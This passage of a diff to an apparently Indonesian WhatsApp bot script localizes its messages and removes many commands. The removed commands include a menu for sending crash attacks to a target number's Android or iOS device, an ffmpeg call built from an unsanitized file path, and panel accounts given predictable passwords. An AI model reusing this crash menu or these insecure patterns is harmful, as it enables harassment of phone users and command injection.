+if (!isPremium) return reply('https://wa.me/27623649420')
 const repf = await zyn.sendMessage(from, { 
 contacts: { 
 displayName: `${list.length} Kontak`, 
@@ -1836,7 +1208,7 @@ forwardingScore: 9999999,
 isForwarded: true,
 mentionedJid: [sender]
 }}, { quoted: m })
-zyn.sendMessage(from, { text : `Nih Owner Gw Jangan Macem"`, contextInfo:{
+zyn.sendMessage(from, { text : `This is Re-Jeong"`, contextInfo:{
 forwardingScore: 9999999, 
 isForwarded: true,
 mentionedJid:[sender]
@@ -1846,10 +1218,10 @@ break
 
 case "addowner":
 if (!isOwner) return reply(mess.only.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 27×××`)
 bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
 let ceknye = await zyn.onWhatsApp(bnnd + `@s.whatsapp.net`)
-if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
+if (ceknye.length == 0) return reply(`number not valid!!!`)
 ownerNumber.push(bnnd)
 fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
 reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
@@ -1857,7 +1229,7 @@ break
 
 case "delowner":
 if (!isOwner) return reply(mess.only.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 27×××`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')
 unp = ownerNumber.indexOf(ya)
 ownerNumber.splice(unp, 1)
@@ -1867,7 +1239,7 @@ break
 
 case 'setowner': {
 if (!isOwner) return reply('kusus owner')
-if (!text) return reply(`Contoh : ${prefix + command} 62×××`)
+if (!text) return reply(`Contoh : ${prefix + command} 27×××`)
 global.owner = text.split("|")[0]
  reply(`Exif berhasil diubah menjadi\n\n• No Owner : ${global.owner}`)
 }
@@ -1882,10 +1254,10 @@ break
 
 case "addprem":{
 if (!isOwner) return reply(mess.only.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 27×××`)
 prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
 let ceknya = await zyn.onWhatsApp(prrkek)
-if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
+if (ceknya.length == 0) return reply(`number not valid!!`)
 prem.push(prrkek)
 fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
 reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
@@ -1894,7 +1266,7 @@ break
 
 case "delprem":{
 if (!isOwner) return reply(mess.only.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 27×××`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
 unp = prem.indexOf(ya)
 prem.splice(unp, 1)
@@ -1907,1511 +1279,6 @@ case 'public': {
 if (!isOwner) return reply(mess.only.owner)
 zyn.public = true
 reply('Succes Mode Public')
-}
-break
-
-case "qc": {
-if (!isOwner)return reply(mess.only.owner)
-if (!quoted){
-const getname = await zyn.getName(mentionUser[0])
-const json = {
-"type": "quote",
-"format": "png",
-"backgroundColor": "#FFFFFF",
-"width": 512,
-"height": 768,
-"scale": 2,
-"messages": [
-{
-"entities": [],
-"avatar": true,
-"from": {
-"id": 1,
-"name": getname,
-"photo": {
-"url": ppuser
-}
-},
-"text": quotedMsg.chats,
-"replyMessage": {}
-}
-]
-};
-const response = axios.post('https://bot.lyo.su/quote/generate', json, {
-headers: {'Content-Type': 'application/json'}
-}).then(res => {
-const buffer = Buffer.from(res.data.result.image, 'base64')
-const opt = { packname: global.packname, author: global.author }
-zyn.sendStimg(from, buffer, m, opt)
-});
-} else if (q) {
-const json = {
-"type": "quote",
-"format": "png",
-"backgroundColor": "#FFFFFF",
-"width": 512,
-"height": 768,
-"scale": 2,
-"messages": [
-{
-"entities": [],
-"avatar": true,
-"from": {
-"id": 1,
-"name": pushname,
-"photo": {
-"url": ppuser
-}
-},
-"text": q,
-"replyMessage": {}
-}
-]
-};
-const response = axios.post('https://bot.lyo.su/quote/generate', json, {
-headers: {'Content-Type': 'application/json'}
-}).then(res => {
-const buffer = Buffer.from(res.data.result.image, 'base64')
-const opt = { packname: global.packname, author: global.author }
-zyn.sendStimg(from, buffer, m, opt)
-});
-} else {
-reply(`Kirim perintah ${prefix+command} ZynTzy`)
-}
-}
-break
-
-case 'mangap': {
-reply(`Makasi Kakak ${pushname} Atas Pujiannya`) 
-}
-break
-
-case 'ai': {
-	if (!text) return reply(`*• Example:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`);  
-await zyn.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
-        try {
-let gpt = await (await fetch(`https://widipe.com/openai?text=${text}`)).json()
-let msgs = generateWAMessageFromContent(m.chat, {
-  viewOnceMessage: {
-    message: {
-        "messageContextInfo": {
-          "deviceListMetadata": {},
-          "deviceListMetadataVersion": 2
-        },
-        interactiveMessage: proto.Message.InteractiveMessage.create({
-          body: proto.Message.InteractiveMessage.Body.create({
-            text: '> Zyn - AI\n\n' + gpt.result
-          }),
-          footer: proto.Message.InteractiveMessage.Footer.create({
-            text: namabot
-          }),
-          header: proto.Message.InteractiveMessage.Header.create({
-          hasMediaAttachment: false,
-          ...await prepareWAMessageMedia({ image: fs.readFileSync('./database/image/Xynz.jpg')}, { upload: zyn.waUploadToServer })  
-          }),
-          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
-            buttons: [{
-            "name": "quick_reply",
-"buttonParamsJson": `{"display_text":"Nice Zyn - AI","id":".mangap"}`
-            }],
-          }),
-          contextInfo: {
-  mentionedJid: [m.sender], 
-  forwardingScore: 999,
-  isForwarded: true,
-forwardedNewsletterMessageInfo: {
-  newsletterJid: '0@newsletter',
-  newsletterName: namabot,
-  serverMessageId: 143
-}
-}
-       })
-    }
-  }
-}, { quoted: m })
-await zyn.relayMessage(m.chat, msgs.message, {})
- } catch(e) {
- return reply("Error Kak :(")
-}
-}
-break
-
-case 'xzyn': {
-if (!isPremium) return reply(mess.only.premium)
-if (!q) return reply(`Example: ${prefix + command} 62×××`)
-target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-				let sections = [{
-						title: '⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟',
-						highlight_label: "👾 𝑨𝒏𝒅𝒓𝒐 👾",
-						rows: [{
-							title: '𝐙𝐲𝐧 𝐀𝐧𝐝𝐫𝐨',
-							id: `vip ${target}`
-						}]
-					},
-					{
-						highlight_label: "👾 𝑨𝒏𝒅𝒓𝒐 👾",
-						rows: [{
-							title: '𝐓𝐫𝐚𝐬𝐡 𝐋𝐨𝐜',
-							id: `andro ${target}`
-						}]
-					},
-					{
-						highlight_label: "👾 𝑨𝒏𝒅𝒓𝒐 👾",
-						rows: [{
-							title: '𝐈𝐧𝐯𝐢𝐬𝐢𝐱 𝐂𝐫𝐚𝐬𝐡',
-							id: `attack ${target}`
-						}]
-					},
-					{
-						title: '⌜ 𝐈𝚯𝐒 ⌟',
-						highlight_label: "👾 𝐀𝐩𝐩𝐥𝐞 👾",
-						rows: [{
-							title: '𝐂𝐫𝐚𝐬𝐡 𝐈𝐨𝐬',
-							id: `xios ${target}`
-						}]
-					},
-					{
-						highlight_label: "👾 𝐀𝐩𝐩𝐥𝐞 👾",
-						rows: [{
-							title: '𝐊𝐢𝐥𝐥 𝐈𝐨𝐬',
-							id: `xip ${target}`
-						}]
-					},
-					{
-						highlight_label: "👾 𝐀𝐩𝐩𝐥𝐞 👾",
-						rows: [{
-							title: '𝐓𝐫𝐚𝐯𝐚 𝐈𝐨𝐬',
-							id: `iphone ${target}`
-						}]
-					},
-					{
-						title: '⌜ 𝐙𝐘𝐍 ⌟',
-						highlight_label: "👾 𝙎𝙖𝙣𝙕 👾",
-						rows: [{
-							title: '𝐂𝐫𝐚𝐬𝐡 𝐅𝐥𝐨𝐰',
-							id: `crashflow ${target}`
-						}]
-					},
-					{
-						highlight_label: "👾 𝙎𝙖𝙣𝙕 👾",
-						rows: [{
-							title: '𝐕𝐚𝐬𝐢𝐨𝐧',
-							id: `vasion ${target}`
-						}]
-					},
-					{
-						highlight_label: "👾 𝙎𝙖𝙣𝙕 👾",
-						rows: [{
-							title: '𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰',
-							id: `overflow ${target}`
-						}]
-					}]
-let listMessage = {
-    title: '⿻ ⌜ 𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇 ⌟ ⿻', 
-    sections
-};
-
-let msg = generateWAMessageFromContent(m.chat, {
- viewOnceMessage: {
- message: {
- "messageContextInfo": {
- "deviceListMetadata": {},
- "deviceListMetadataVersion": 2
- },
- interactiveMessage: proto.Message.InteractiveMessage.create({
- contextInfo: {
- mentionedJid: [m.sender], 
- isForwarded: true, 
- forwardedNewsletterMessageInfo: {
- newsletterJid: "0@newsletter",
- newsletterName: 'Powered By ZynTzy', 
- serverMessageId: -1
-},
- businessMessageForwardInfo: { businessOwnerJid: zyn.decodeJid(zyn.user.id) },
- }, 
- body: proto.Message.InteractiveMessage.Body.create({
- text: (`𝐀𝐓𝐓𝐀𝐂𝐊 : ${target}`)
- }),
- footer: proto.Message.InteractiveMessage.Footer.create({
- text: ``
- }),
- header: proto.Message.InteractiveMessage.Header.create({
- title: '',
- subtitle: "𝐙𝐲𝐧𝐓𝐳𝐲",
- hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/xbug.jpg")}, { upload: zyn.waUploadToServer })) 
- }),
- nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
- buttons: [ 
- {
- "name": "single_select",
-"buttonParamsJson": JSON.stringify(listMessage)
-},  {
- "name": "cta_url",
- "buttonParamsJson": "{\"display_text\":\"My Creator\",\"url\":\"https://whatsapp.com/channel/0029VahNvB6IyPtUAQ4qSl32\",\"merchant_url\":\"https://whatsapp.com/channel/0029VahNvB6IyPtUAQ4qSl32\"}"
- },
- ]
- })
- })
- }
- }
-}, {})
-
-await zyn.relayMessage(msg.key.remoteJid, msg.message, {
- messageId: msg.key.id
-})}
-break
-
-case 'hdvid' :
-case 'hdvideo': 
-case 'vidiohd':
-case 'tohd': 
-case 'vidhd' : {
-const { TelegraPh } = require('../database/lib//uploader');
-const { exec } = require('child_process');
-const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? zyn.user.jid : m.sender;
-//const name = await zyn.getName(who);
-const q = m.quoted ? m.quoted : m;
-const mime = (q.msg || q).mimetype || '';
-if (!mime) return m.reply(`Mana vidio nya bang?`);
-reply(mess.wait);
-const media = await zyn.downloadAndSaveMediaMessage(q);
-const url = await TelegraPh(media);
-const output = 'output.mp4'; // Nama file output
-// Menggunakan ffmpeg untuk meningkatkan resolusi video ke 1080p
-exec(`ffmpeg -i ${media} -s 1280x720 -c:v libx264 -c:a copy ${output}`, (error, stdout, stderr) => {
-  if (error) {
-    console.error(`Error: ${error.message}`);
-    return;
-  }
-  console.log(`stdout: ${stdout}`);
-  console.error(`stderr: ${stderr}`);
-
-  // Mengunggah video yang telah ditingkatkan resolusinya
-  zyn.sendMessage(m.chat, { caption: `_Success To HD Video_`, video: { url: output }}, {quoted: m});
-})
-await sleep(60000)
-fs.unlinkSync(output)
-fs.unlinkSync(media)
-}
-break
-
-case 'enc': case 'encrypt': case 'obfuscate':
-{
-if (!q) return reply(`Contoh ${prefix+command} const time = require('money')`)
-let meg = await obfus(q)
-reply(`${meg.result}`)
-}
-break
-
-case '1gb': {
-if(!isPremium){
-reply(mess.only.premium)
-}
-if (!isOwner) return reply(mess.only.owner)
-let t = text.split(','); 
-if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
-let username = t[0];
-let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
-let name = username
-let egg = global.eggsnya
-let loc = global.location
-let memo = "1024"
-let cpu = "50"
-let disk = "1024"
-let email = username + "Zyn@Tzy.com"
-akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
-if (!u) return
-let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
-let password = username+'001'
-let f = await fetch(domain + "/api/application/users", {
-"method": "POST",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey
-},
-"body": JSON.stringify({
-"email": email,
-"username": username,
-"first_name": username,
-"last_name": username,
-"language": "en",
-"password": password
-})
-})
-let data = await f.json();
-if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
-let user = data.attributes
-let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
-"method": "GET",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey
-}
-})
-reply(`User ID: ${user.id}`)
-let ctf = `Hai @${m.sender.split('@')[0]}
- Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩
-
-👤 Username: ${user.username}
-🔐 Password: ${password}
-🔗 Url: ${domain}`
-zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
-let data2 = await f2.json()
-let startup_cmd = data2.attributes.startup
-let f3 = await fetch(domain + "/api/application/servers", {
-"method": "POST",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey,
-},
-"body": JSON.stringify({
-"name": name+' - 1gb',
-"description": 'Create with '+namabot,
-"user": user.id,
-"egg": parseInt(egg),
-"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
-"startup": startup_cmd,
-"environment": {
-"INST": "npm",
-"USER_UPLOAD": "0",
-"AUTO_UPDATE": "0",
-"CMD_RUN": "npm start"
-},
-"limits": {
-"memory": memo,
-"swap": 0,
-"disk": disk,
-"io": 500,
-"cpu": cpu
-},
-"feature_limits": {
-"databases": 5,
-"backups": 5,
-"allocations": 5
-},
-deploy: {
-locations: [parseInt(loc)],
-dedicated_ip: false,
-port_range: [],
-},
-})
-})
-let res = await f3.json()
-if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
-let server = res.attributes
-let p = await reply(`Sukses menambahkan User dan Server
-
-Type: user
-
-Id: ${user.id}
-Username: ${user.username}
-Email: ${user.email}
-Name: ${user.first_name} ${user.last_name}
-Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
-Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
-Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
-}
-break
-
-case '2gb': {
-if(!isPremium){
-reply(mess.only.premium)
-}
-if (!isOwner) return reply(mess.only.owner)
-let t = text.split(','); 
-if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
-let username = t[0];
-let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
-let name = username
-let egg = global.eggsnya
-let loc = global.location
-let memo = "2024"
-let cpu = "70"
-let disk = "2024"
-let email = username + "Zyn@Tzy.com"
-akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
-if (!u) return
-let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
-let password = username+'001'
-let f = await fetch(domain + "/api/application/users", {
-"method": "POST",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey
-},
-"body": JSON.stringify({
-"email": email,
-"username": username,
-"first_name": username,
-"last_name": username,
-"language": "en",
-"password": password
-})
-})
-let data = await f.json();
-if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
-let user = data.attributes
-let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
-"method": "GET",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey
-}
-})
-reply(`User ID: ${user.id}`)
-let ctf = `Hai @${m.sender.split('@')[0]}
- Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩
-
-👤 Username: ${user.username}
-🔐 Password: ${password}
-🔗 Url: ${domain}`
-zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
-let data2 = await f2.json()
-let startup_cmd = data2.attributes.startup
-let f3 = await fetch(domain + "/api/application/servers", {
-"method": "POST",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey,
-},
-"body": JSON.stringify({
-"name": name+' - 1gb',
-"description": 'Create with '+namabot,
-"user": user.id,
-"egg": parseInt(egg),
-"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
-"startup": startup_cmd,
-"environment": {
-"INST": "npm",
-"USER_UPLOAD": "0",
-"AUTO_UPDATE": "0",
-"CMD_RUN": "npm start"
-},
-"limits": {
-"memory": memo,
-"swap": 0,
-"disk": disk,
-"io": 500,
-"cpu": cpu
-},
-"feature_limits": {
-"databases": 5,
-"backups": 5,
-"allocations": 5
-},
-deploy: {
-locations: [parseInt(loc)],
-dedicated_ip: false,
-port_range: [],
-},
-})
-})
-let res = await f3.json()
-if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
-let server = res.attributes
-let p = await reply(`Sukses menambahkan User dan Server
-
-Type: user
-
-Id: ${user.id}
-Username: ${user.username}
-Email: ${user.email}
-Name: ${user.first_name} ${user.last_name}
-Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
-Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
-Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
-}
-break
-
-case '3gb': {
-if(!isPremium){
-reply(mess.only.premium)
-}
-if (!isOwner) return reply(mess.only.owner)
-let t = text.split(','); 
-if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
-let username = t[0];
-let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
-let name = username
-let egg = global.eggsnya
-let loc = global.location
-let memo = "3024"
-let cpu = "80"
-let disk = "3024"
-let email = username + "Zyn@Tzy.com"
-akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
-if (!u) return
-let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
-let password = username+'001'
-let f = await fetch(domain + "/api/application/users", {
-"method": "POST",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey
-},
-"body": JSON.stringify({
-"email": email,
-"username": username,
-"first_name": username,
-"last_name": username,
-"language": "en",
-"password": password
-})
-})
-let data = await f.json();
-if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
-let user = data.attributes
-let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
-"method": "GET",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey
-}
-})
-reply(`User ID: ${user.id}`)
-let ctf = `Hai @${m.sender.split('@')[0]}
- Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩
-
-👤 Username: ${user.username}
-🔐 Password: ${password}
-🔗 Url: ${domain}`
-zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
-let data2 = await f2.json()
-let startup_cmd = data2.attributes.startup
-let f3 = await fetch(domain + "/api/application/servers", {
-"method": "POST",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey,
-},
-"body": JSON.stringify({
-"name": name+' - 1gb',
-"description": 'Create with '+namabot,
-"user": user.id,
-"egg": parseInt(egg),
-"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
-"startup": startup_cmd,
-"environment": {
-"INST": "npm",
-"USER_UPLOAD": "0",
-"AUTO_UPDATE": "0",
-"CMD_RUN": "npm start"
-},
-"limits": {
-"memory": memo,
-"swap": 0,
-"disk": disk,
-"io": 500,
-"cpu": cpu
-},
-"feature_limits": {
-"databases": 5,
-"backups": 5,
-"allocations": 5
-},
-deploy: {
-locations: [parseInt(loc)],
-dedicated_ip: false,
-port_range: [],
-},
-})
-})
-let res = await f3.json()
-if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
-let server = res.attributes
-let p = await reply(`Sukses menambahkan User dan Server
-
-Type: user
-
-Id: ${user.id}
-Username: ${user.username}
-Email: ${user.email}
-Name: ${user.first_name} ${user.last_name}
-Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
-Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
-Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
-}
-break
-
-case '4gb': {
-if(!isPremium){
-reply(mess.only.premium)
-}
-if (!isOwner) return reply(mess.only.owner)
-let t = text.split(','); 
-if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
-let username = t[0];
-let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
-let name = username
-let egg = global.eggsnya
-let loc = global.location
-let memo = "4024"
-let cpu = "80"
-let disk = "4024"
-let email = username + "Zyn@Tzy.com"
-akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
-if (!u) return
-let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
-let password = username+'001'
-let f = await fetch(domain + "/api/application/users", {
-"method": "POST",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey
-},
-"body": JSON.stringify({
-"email": email,
-"username": username,
-"first_name": username,
-"last_name": username,
-"language": "en",
-"password": password
-})
-})
-let data = await f.json();
-if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
-let user = data.attributes
-let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
-"method": "GET",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey
-}
-})
-reply(`User ID: ${user.id}`)
-let ctf = `Hai @${m.sender.split('@')[0]}
- Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩
-
-👤 Username: ${user.username}
-🔐 Password: ${password}
-🔗 Url: ${domain}`
-zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
-let data2 = await f2.json()
-let startup_cmd = data2.attributes.startup
-let f3 = await fetch(domain + "/api/application/servers", {
-"method": "POST",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey,
-},
-"body": JSON.stringify({
-"name": name+' - 1gb',
-"description": 'Create with '+namabot,
-"user": user.id,
-"egg": parseInt(egg),
-"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
-"startup": startup_cmd,
-"environment": {
-"INST": "npm",
-"USER_UPLOAD": "0",
-"AUTO_UPDATE": "0",
-"CMD_RUN": "npm start"
-},
-"limits": {
-"memory": memo,
-"swap": 0,
-"disk": disk,
-"io": 500,
-"cpu": cpu
-},
-"feature_limits": {
-"databases": 5,
-"backups": 5,
-"allocations": 5
-},
-deploy: {
-locations: [parseInt(loc)],
-dedicated_ip: false,
-port_range: [],
-},
-})
-})
-let res = await f3.json()
-if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
-let server = res.attributes
-let p = await reply(`Sukses menambahkan User dan Server
-
-Type: user
-
-Id: ${user.id}
-Username: ${user.username}
-Email: ${user.email}
-Name: ${user.first_name} ${user.last_name}
-Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
-Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
-Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
-}
-break
-
-case '5gb': {
-if(!isPremium){
-reply(mess.only.premium)
-}
-if (!isOwner) return reply(mess.only.owner)
-let t = text.split(','); 
-if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
-let username = t[0];
-let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
-let name = username
-let egg = global.eggsnya
-let loc = global.location
-let memo = "5024"
-let cpu = "100"
-let disk = "5024"
-let email = username + "Zyn@Tzy.com"
-akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
-if (!u) return
-let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
-let password = username+'001'
-let f = await fetch(domain + "/api/application/users", {
-"method": "POST",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey
-},
-"body": JSON.stringify({
-"email": email,
-"username": username,
-"first_name": username,
-"last_name": username,
-"language": "en",
-"password": password
-})
-})
-let data = await f.json();
-if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
-let user = data.attributes
-let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
-"method": "GET",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey
-}
-})
-reply(`User ID: ${user.id}`)
-let ctf = `Hai @${m.sender.split('@')[0]}
- Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩
-
-👤 Username: ${user.username}
-🔐 Password: ${password}
-🔗 Url: ${domain}`
-zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
-let data2 = await f2.json()
-let startup_cmd = data2.attributes.startup
-let f3 = await fetch(domain + "/api/application/servers", {
-"method": "POST",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey,
-},
-"body": JSON.stringify({
-"name": name+' - 1gb',
-"description": 'Create with '+namabot,
-"user": user.id,
-"egg": parseInt(egg),
-"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
-"startup": startup_cmd,
-"environment": {
-"INST": "npm",
-"USER_UPLOAD": "0",
-"AUTO_UPDATE": "0",
-"CMD_RUN": "npm start"
-},
-"limits": {
-"memory": memo,
-"swap": 0,
-"disk": disk,
-"io": 500,
-"cpu": cpu
-},
-"feature_limits": {
-"databases": 5,
-"backups": 5,
-"allocations": 5
-},
-deploy: {
-locations: [parseInt(loc)],
-dedicated_ip: false,
-port_range: [],
-},
-})
-})
-let res = await f3.json()
-if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
-let server = res.attributes
-let p = await reply(`Sukses menambahkan User dan Server
-
-Type: user
-
-Id: ${user.id}
-Username: ${user.username}
-Email: ${user.email}
-Name: ${user.first_name} ${user.last_name}
-Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
-Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
-Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
-}
-break
-
-case '6gb': {
-if(!isPremium){
-reply(mess.only.premium)
-}
-if (!isOwner) return reply(mess.only.owner)
-let t = text.split(','); 
-if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
-let username = t[0];
-let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
-let name = username
-let egg = global.eggsnya
-let loc = global.location
-let memo = "6024"
-let cpu = "160"
-let disk = "6024"
-let email = username + "Zyn@Tzy.com"
-akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
-if (!u) return
-let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
-let password = username+'001'
-let f = await fetch(domain + "/api/application/users", {
-"method": "POST",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey
-},
-"body": JSON.stringify({
-"email": email,
-"username": username,
-"first_name": username,
-"last_name": username,
-"language": "en",
-"password": password
-})
-})
-let data = await f.json();
-if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
-let user = data.attributes
-let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
-"method": "GET",
-"headers": {
-"Accept": "application/json",
-"Content-Type": "application/json",
-"Authorization": "Bearer " + apikey
-}
-})
-reply(`User ID: ${user.id}`)
-let ctf = `Hai @${m.sender.split('@')[0]}
- Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩
-
-👤 Username: ${user.username}
-🔐 Password: ${password}
-🔗 Url: ${domain}`
-zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
-let data2 = await f2.json()
-let startup_cmd = data2.attributes.startup
-let f3 = await fetch(domain + "/api/application/servers", {
